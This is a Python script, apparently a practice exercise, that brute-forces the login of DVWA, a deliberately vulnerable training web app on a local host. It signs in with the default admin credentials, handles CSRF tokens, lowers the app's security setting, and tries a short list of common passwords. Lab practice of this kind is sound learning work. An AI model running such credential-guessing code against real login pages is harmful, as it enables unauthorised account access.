#!/usr/bin/python3
import requests
import re

print("="*60)
print("DVWA BRUTEFORCE - WORKING VERSION")
print("="*60)

s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0'})

# БАЗОВЫЙ URL
BASE_URL = "http://dvwa.local/"
print(f"Using URL: {BASE_URL}")

# 1. Получаем CSRF токен
print("[1] Getting CSRF token...")
r = s.get(f"{BASE_URL}login.php")

# Ищем CSRF токен
csrf_token = None
if 'user_token' in r.text:
    match = re.search(r'name="user_token" value="([^"]+)"', r.text)
    if match:
        csrf_token = match.group(1)
        print(f"  Found CSRF token: {csrf_token[:10]}...")
else:
    print("  No CSRF token found")

# 2. Логинимся
print("[2] Logging in...")
login_data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
    'user_token': csrf_token if csrf_token else ''
}

r = s.post(f"{BASE_URL}login.php", data=login_data)

# Проверяем логин
if 'logout' in r.text.lower() or 'Logout' in r.text:
    print("  [SUCCESS] Logged in")
else:
    print("  [WARNING] Login check failed")
    print("  Response preview:", r.text[:100])

# 3. Ставим security low
print("[3] Setting security to low...")
security_data = {'security': 'low', 'seclev_submit': 'Submit'}

# Получаем токен для security.php
r = s.get(f"{BASE_URL}security.php")
match = re.search(r'name="user_token" value="([^"]+)"', r.text)
if match:
    security_data['user_token'] = match.group(1)

s.post(f"{BASE_URL}security.php", data=security_data)
print("  Security set to low")

# 4. БРУТФОРС
print("\n[4] BRUTEFORCE ATTACK STARTING")
print("-"*40)

brute_url = f"{BASE_URL}vulnerabilities/brute/"

# Загружаем страницу brute force
r = s.get(brute_url)
print(f"Brute force page: {len(r.text)} chars")

# Тестовые пароли
test_passwords = [
    'password',    # Правильный для admin
    '123456',
    'admin',
    'letmein',
    'abc123'       # Для пользователя gordonb
]

print(f"\nTesting {len(test_passwords)} passwords...")

for i, pwd in enumerate(test_passwords, 1):
    print(f"\n[{i}] Testing: admin / {pwd}")
    
    # Делаем запрос
    full_url = f"{brute_url}?username=admin&password={pwd}&Login=Login"
    r = s.get(full_url)
    
    print(f"  Response: {len(r.text)} chars")
    
    # Проверяем УСПЕХ
    if 'Welcome to the password protected area' in r.text:
        print(f"  [SUCCESS] Password found: {pwd}")
        print(f"  [PROOF] 'Welcome to the password protected area'")
        break
    elif 'Username and/or password incorrect' in r.text:
        print(f"  [FAILED] Incorrect password")
    else:
        print(f"  [UNKNOWN] Different response")
        # Быстрый анализ
        if 'CSRF' in r.text:
            print(f"  Note: CSRF token issue")
        
print("\n" + "="*60)
print("COMPLETE")
